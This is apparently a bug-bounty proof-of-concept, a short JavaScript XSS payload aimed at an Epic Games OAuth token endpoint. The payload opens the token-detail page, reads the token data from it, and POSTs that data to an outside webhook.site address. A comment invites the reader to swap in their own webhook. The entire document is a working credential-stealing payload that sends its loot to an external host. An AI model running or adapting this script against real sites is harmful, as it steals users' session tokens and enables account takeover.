(function() {
  alert('Working for XSS')
  const headers = {'Access-Control-Allow-Origin': '*','X-Bug-Bounty': 'Hackerone-johnathanrs','Content-Type': 'application/json'};
  const target = window.open('https://content-service.bfda.live.use1a.on.epicgames.com/oauth/v1/token-detail');
  const data = target.document.querySelectorAll('pre')[0].firstChild.data;
  target.close();
  fetch('https://webhook.site/1da67bcc-a46f-48c1-b171-9339305c7be0',{method:'POST',body:JSON.stringify(data), headers:headers}); // replace webhook with your own code
})();
